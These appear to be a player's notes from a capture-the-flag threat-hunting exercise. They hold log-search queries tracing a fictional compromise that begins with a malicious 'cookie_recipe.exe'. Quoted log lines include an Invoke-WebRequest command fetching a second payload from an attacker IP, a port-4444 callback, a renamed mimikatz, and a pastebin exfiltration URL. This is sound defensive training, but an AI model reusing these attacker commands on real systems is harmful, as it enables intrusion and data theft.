ProcessImage:C\:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe
--> prints cookie1 powershell at bottom

elfu-res-wks1 MSWinEventLog	1	Microsoft-Windows-Sysmon/Operational	2442	Tue Nov 19 05:24:15 2019	1	Microsoft-Windows-Sysmon	SYSTEM	User	Information	elfu-res-wks1	Process Create (rule: ProcessCreate)		Process Create:  RuleName:   UtcTime: 2019-11-19 13:24:15.595  ProcessGuid: {BA5C6BBB-ECFF-5DD3-0000-0010AE583300}  ProcessId: 1864  Image: C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe  FileVersion: 10.0.14393.206 (rs1_release.160915-0644)  Description: Windows PowerShell  Product: Microsoft® Windows® Operating System  Company: Microsoft Corporation  OriginalFileName: PowerShell.EXE  CommandLine: C:\Windows\system32\cmd.exe /c "whoami "  CurrentDirectory: C:\Users\minty\Downloads\  User: ELFU-RES-WKS1\minty  LogonGuid: {BA5C6BBB-E7A5-5DD3-0000-002082670700}  LogonId: 0x76782  TerminalSessionId: 1  IntegrityLevel: High  Hashes: MD5=65D86C34814C02569E2AD53FD24E7F61  ParentProcessGuid: {BA5C6BBB-ECF2-5DD3-0000-001086363300}  ParentProcessId: 5256  ParentImage: C:\Users\minty\Downloads\cookie_recipe.exe  ParentCommandLine: "C:\Users\minty\Downloads\cookie_recipe.exe" 	20133

Scrolling up we have a webrequest run:
C:\Windows\system32\cmd.exe /c "Invoke-WebRequest -Uri http://192.168.247.175/cookie_recipe2.exe -OutFile cookie_recipe2.exe "

ParentProcessImage:C\:\\Users\\minty\\Downloads\\cookie_recipe.exe OR "cookie_recipe.exe"

--> we have a webrequest [192.168.247.175:4444]!

but a better way:
ParentProcessImage:C\:\\Users\\minty\\Downloads\\cookie_recipe.exe OR "cookie_recipe.exe" AND EventID:3

first command (scroll up): whoami
ParentProcessImage to the rescue!

ParentProcessImage:C\:\\Users\\minty\\Downloads\\cookie_recipe.exe OR "cookie_recipe.exe" OR "cookie_recipe2.exe" AND "IntegrityLevel: System"
C:\WebExService.exe

(scroll up)
C:\mimikatz.exe -> wrong, they downloaded it as cookie (urgh, silly attackers)

C:\cookie.exe

alabaster:
AccountName:minty OR AccountName:holly OR AccountName:DWM\-2 OR AccountName:DWM\-1 OR AccountName:alabaster AND (DestinationHostname:elfu\-res\-wks3 OR DestinationHostname:elfu\-res\-wks2)

Windows Event Id 4624 is generated when a user network logon occurs successfully. We can also filter on the attacker's IP using SourceNetworkAddress.

rdp



http OR https AND ProcessImage:C\:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe
--> prints out powershell cookie virus (cookie 2)


DestinationPort:3389 OR DestinationPort:3390 OR SourcePort:3389 OR SourcePort:3390

None of these times work. :(

LogonType:10
-->
06:04:28
Bingo!

First other login looks like:
ELFU-RES-WKS2,elfu-res-wks3,3

Cutoff time: 2019-11-19 05:24:15.000 --> start of initial callback session.
timestamp:["2019-11-19 05:24:15.000" TO "2020-01-01 00:00:00.000"]

TargetFilename:/.+\.pdf/

--->

C:\Users\alabaster\Desktop\super_secret_elfu_research.pdf

"C\:\\Users\\alabaster\\Desktop\\super_secret_elfu_research.pdf" OR "https://pastebin.com/post.php" OR ProcessId: 1232

